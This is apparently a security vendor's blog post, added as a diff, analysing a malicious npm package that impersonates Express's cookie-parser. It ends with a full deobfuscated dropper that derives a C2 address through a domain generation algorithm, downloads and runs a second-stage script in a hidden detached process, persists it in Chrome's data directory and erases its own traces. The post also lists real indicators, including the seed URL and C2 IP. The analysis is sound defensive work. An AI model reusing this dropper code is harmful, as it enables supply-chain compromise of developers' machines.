@@ -1,0 +1,335 @@
+---
+publishDate: 2025-04-23T00:00:00Z
+title: 'Malicious npm Package Impersonating Popular Express Cookie Parser'
+image: /images/malicious-npm-express-cookie-parser.png
+excerpt: A malicious npm package impersonating the popular Express cookie parser package was discovered by SafeDep Cloud malicious package scanning service.
+tags:
+  - vet
+  - cloud
+  - malware
+---
+
+import CallToAction from '~/components/widgets/CallToAction.astro';
+import { YouTube } from 'astro-embed';
+
+Today we found malicious npm package [express-cookie-parser](https://platform.safedep.io/community/malysis/01JSGWAWH87QKPKGMRK6Q0R6ZH) impersonating the popular Express [cookie-parser](https://www.npmjs.com/package/cookie-parser) package. The `README.md` file for `express-cookie-parser` is a mirror of the `cookie-parser` package. The malicious payload is in `cookie-loader.min.js` in the analyzed version `1.4.12`. The payload performs the following:
+
+- Acts as `stage-1` or dropper payload for `stage-2` payload
+- Fetches seed file `https://raw.githubusercontent.com/johns92/blog_app/refs/heads/main/server/.env.example`
+- Generates a C2 server server domain based on hardcoded `496AAC7E` and SHA256 hash of the seed file
+- The C2 URL is of the format `http://${domain}/public/startup.js?ver=1.2&type=module`
+- Downloads `startup.js` from the C2 server and executes it using `node` executable found on the system
+- Deletes `cookie-loader.min.js` after execution and re-writes `index.js` to remove `require('./cookie-loader.min')`
+
+At the time of writing, the URL `https://raw.githubusercontent.com/johns92/blog_app/refs/heads/main/server/.env.example` contains the following payload:
+
+```text
+JWT_SECRET=
+EXPIRATION=9999h
+PORT=5555
+DB_USER=admin
+DB_PASS=123456
+```
+
+As per our analysis, the SHA256 hash of the above content is used to generate the C2 server domain using a [Domain Generation Algorithm](https://en.wikipedia.org/wiki/Domain_generation_algorithm).
+
+## Investigation
+
+We decided to analyze `express-cookie-parser@1.4.12` closely to identify the malicious behavior. The `package.json` is the most common attack vector for malicious npm packages as we have seen in [analyzing 5000+ malicious packages](malysis-evaluation-using-datadog-malicious-packages-dataset). However, for this sample, the `package.json` appears to be similar to the original `cookie-parser` package. However, the `index.js` loads the malicious payload while providing facades for API compatibility.
+
+Lets take a look at the `index.js` file:
+
+```js
+// Loads dependency packages
+var cookie = require('cookie')
+var signature = require('cookie-signature')
+
+// Loads the malicious payload
+require('./cookie-loader.min')
+
+// [...]
+
+function cookieParser (secret, options) {
+  // Defines the cookieParser function for API compatibility
+  // [...]
+}
+```
+
+Next we looked at the `cookie-loader.min.js` file which is the actual malicious payload. However, it was minified and obfuscated to make it harder to read and analyze by humans or static analysis tools.
+
+![](/images/express-cookie-loader-payload.png)
+
+The `cookie-loader.min.js` file is a dropper for the `startup.js` file that is fetched from a remote C2 server generated using a [Domain Generation Algorithm](https://en.wikipedia.org/wiki/Domain_generation_algorithm) with a fixed value of `496AAC7E`.
+
+Based on our analysis, `cookie-loader.min.js` does the following:
+
+- Identifies the path of `node` executable on the system for Windows, Linux and macOS platforms
+- Computes the Google Chrome user data directory path based on the OS for persistence (dropping `startup.js`)
+- Computes C2 domain using [Domain Generation Algorithm](https://en.wikipedia.org/wiki/Domain_generation_algorithm) with a fixed value of `496AAC7E` and SHA256 hash of the seed file
+- Downloads `startup.js` from the C2 server and executes it using `node` executable found on the system
+- Deletes `cookie-loader.min.js` after execution and re-writes `index.js` to remove `require('./cookie-loader.min')`
+
+It also contains code to delete `cookie-loader.min.js` after execution and remove the reference from `index.js`. The following code performs this operation:
+
+```js
+function f() {
+    l.unlinkSync(__filename);
+    var e, t = r.join(__dirname, "index.js");
+    l.existsSync(t) && (e = l.readFileSync(t).toString(), l.writeFileSync(t, e.replace("require('./cookie-loader.min')", "")))
+}
+```
+
+See the [deobfuscated version](#deobfuscated-cookie-loader-min-js) of the `cookie-loader.min.js` file for more details.
+
+## What to do if you are affected?
+
+- Remove the package using `npm remove express-cookie-parser`
+
+For critical systems, we recommend that the system should be considered compromised and appropriate incident response process should kick-in.
+
+## How can SafeDep help?
+
+Our free and open source tool [vet](https://github.com/safedep/vet) is integrated with the SafeDep Cloud Package Scanning Service and can be used to detect malicious packages before they are installed. [vet-action](https://github.com/safedep/vet-action) is a GitHub Action that can be used to establish proactive guardrails against malicious open source packages in your GitHub Actions workflows.
+
+## Indicator of Compromise (IOC)
+
+- Seed file URL `https://raw.githubusercontent.com/johns92/blog_app/refs/heads/main/server/.env.example`
+- C2 server domain generation algorithm key `496AAC7E`
+- C2 server IP `206.214.129.67` generated by the DGA using SHA256 hash of the seed file and the key `496AAC7E`
+
+### Deobfuscated `cookie-loader.min.js`
+
+Following is the deobfuscated version of the `cookie-loader.min.js` file:
+
+```js
+// Import required Node.js modules
+const { spawn, exec } = require("child_process");
+const path = require("path");
+const https = require("https");
+const http = require("http");
+const fs = require("fs");
+const os = require("os");
+const crypto = require("crypto");
+
+// Create a SHA-256 hash object for later use
+const sha256Hash = crypto.createHash("sha256");
+
+// Base64 encoded URL for the initial payload
+// Decodes to: https://raw.githubusercontent.com/johns92/blog_app/refs/heads/main/server/.env.example
+const encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pvaG5zOTIvYmxvZ19hcHAvcmVmcy9oZWFkcy9tYWluL3NlcnZlci8uZW52LmV4YW1wbGU=";
+const decodedUrl = atob(encodedUrl);
+
+/**
+ * Gets the path to the node executable on the system based on platform
+ * This ensures the malware can run node processes on any OS
+ */
+function getNodePath() {
+  // For Linux and macOS
+  if (os.platform() === "linux" || os.platform() === "darwin") {
+    return new Promise((resolve, reject) => {
+      exec("which node", { windowsHide: true }, (error, stdout, stderr) => {
+        if (error || stderr) {
+          reject("Node.js not found");
+        } else {
+          resolve(stdout.trim());
+        }
+      });
+    });
+  } 
+  // For Windows
+  else if (os.platform() === "win32") {
+    return new Promise((resolve, reject) => {
+      exec("where node", { windowsHide: true }, (error, stdout, stderr) => {
+        if (error || stderr) {
+          callback(null);
+        } else {
+          const nodePath = stdout.split("\n")[0].trim();
+          resolve(nodePath);
+        }
+      });
+    });
+  }
+}
+
+/**
+ * Creates a path for the malicious script
+ * Targets Chrome browser directories for persistence and to avoid detection
+ */
+let getScriptPath = () => {
+  let browserDataDir = null;
+  const homeDir = os.homedir();
+  
+  // First attempt: Target Chrome user data directories based on OS
+  if (os.platform() === "win32") {
+    browserDataDir = path.join(homeDir, "AppData", "Local", "Google", "Chrome", "User Data");
+  } else if (os.platform() === "linux") {
+    browserDataDir = path.join(homeDir, ".config", "google-chrome");
+  } else if (os.platform() === "darwin") {
+    browserDataDir = path.join(homeDir, "Library", "Application Support", "Google", "Chrome");
+  }
+  
+  // Fallback: Use more generic locations if Chrome dirs don't exist
+  if (!fs.existsSync(browserDataDir)) {
+    if (os.platform() === "win32") {
+      browserDataDir = path.join(homeDir, "AppData", "Local");
+    } else if (os.platform() === "linux") {
+      browserDataDir = path.join(homeDir, ".config");
+    } else if (os.platform() === "darwin") {
+      browserDataDir = path.join(homeDir, "Library", "Application Support");
+    }
+  }
+  
+  // Create directory if it doesn't exist
+  if (!fs.existsSync(browserDataDir)) {
+    fs.mkdirSync(browserDataDir, { recursive: true });
+  }
+  
+  // Create a Scripts directory in the browser data folder
+  const scriptsDir = path.join(browserDataDir, "Scripts");
+  
+  // Create Scripts directory if it doesn't exist
+  if (!fs.existsSync(scriptsDir)) {
+    fs.mkdirSync(scriptsDir, { recursive: true });
+  }
+  
+  // Return path for the malware script
+  const malwarePath = path.join(scriptsDir, "startup.js");
+  return malwarePath;
+};
+
+/**
+ * Executes a node script in a detached process
+ * This allows the malware to run independently from the parent process
+ */
+function runScript(scriptPath) {
+  spawn("node", [scriptPath], {
+    detached: true,      // Makes process independent from parent
+    stdio: "ignore",     // Prevents any output being shown
+    windowsHide: true    // Prevents window from being shown on Windows
+  }).unref();            // Allows parent to exit independently
+}
+
+/**
+ * Covers tracks by removing the malicious loader and editing the index.js file
+ * This helps avoid detection after the malware has been installed
+ */
+function coverTracks() {
+  // Delete this malicious file
+  fs.unlinkSync(__filename);
+  
+  // Remove the require statement from index.js to hide evidence
+  const indexPath = path.join(__dirname, "index.js");
+  
+  if (fs.existsSync(indexPath)) {
+    const indexContent = fs.readFileSync(indexPath).toString();
+    // Remove the require statement for this malicious module
+    fs.writeFileSync(indexPath, indexContent.replace("require('./cookie-loader.min')", ""));
+  }
+}
+
+/**
+ * Updates the downloaded script with the absolute path to node
+ * This ensures the script can be executed as a standalone file
+ */
+async function fixNodePath(scriptPath) {
+  // Only needed for non-Windows platforms
+  if (os.platform() !== "win32") {
+    const scriptContent = fs.readFileSync(scriptPath).toString();
+    const nodePath = await getNodePath();
+    // Replace "node" with the absolute path
+    const updatedContent = scriptContent.replace('"node"', '"' + nodePath + '"');
+    fs.writeFileSync(scriptPath, updatedContent);
+  }
+}
+
+/**
+ * Downloads a file from a URL to a specified location
+ */
+function downloadFile(url, targetPath) {
+  // Choose http or https based on URL
+  let httpModule = url.startsWith("https") ? https : http;
+  
+  return new Promise((resolve, reject) => {
+    httpModule.get(url, (response) => {
+      if (response.statusCode !== 200) {
+        reject("");
+        return;
+      }
+      
+      const fileStream = fs.createWriteStream(targetPath);
+      response.pipe(fileStream);
+      
+      fileStream.on("finish", () => {
+        resolve("");
+      });
+    });
+  });
+}
+
+/**
+ * Domain generation algorithm using XOR operations
+ * Creates C2 (command and control) server address from file hash and fixed value
+ */
+function generateDomain(hash, fixedValue) {
+  // XOR each byte of the hash with the fixed value
+  let result = "";
+  for (let i = 0; i < fixedValue.length; i++) {
+    const xorResult = parseInt(hash[i], 16) ^ parseInt(fixedValue[i], 16);
+    result += xorResult.toString(16);
+  }
+  
+  // Convert the hex result to a dotted IP address format
+  let ipAddress = "";
+  for (let i = 0; i < result.length; i += 2) {
+    if (ipAddress) {
+      ipAddress += ".";
+    }
+    ipAddress += parseInt(result.slice(i, i + 2), 16).toString();
+  }
+  
+  return ipAddress;
+}
+
+/**
+ * Creates the URL for downloading the actual malware payload
+ */
+function createMalwareUrl(domain) {
+  return `http://${domain}/public/startup.js?ver=1.2&type=module`;
+}
+
+/**
+ * Main execution function that orchestrates the attack
+ */
+function executeAttack() {
+  // Get the target path for the malware
+  let targetPath = getScriptPath();
+  
+  // Download the initial script, generate domain, download malware, and execute it
+  downloadFile(decodedUrl, targetPath)
+    .then(() => {
+      // Calculate hash of the downloaded file
+      const fileContent = fs.readFileSync(targetPath);
+      sha256Hash.update(fileContent);
+      const fileHash = sha256Hash.digest("hex");
+      
+      // Generate C2 domain using the hash and a fixed value
+      return createMalwareUrl(generateDomain(fileHash, "496AAC7E"));
+    })
+    .then(malwareUrl => downloadFile(malwareUrl, targetPath))
+    .then(() => fixNodePath(targetPath))
+    .then(() => {
+      // Make the script executable and run it
+      fs.chmodSync(targetPath, "755");
+      runScript(targetPath);
+    })
+    .finally(() => {
+      // Clean up after 1.5 seconds to allow time for script to execute
+      setTimeout(() => {
+        coverTracks();
+      }, 1500);
+    });
+}
+
+// Execute the malicious code immediately when this file is required
+executeAttack();
+```
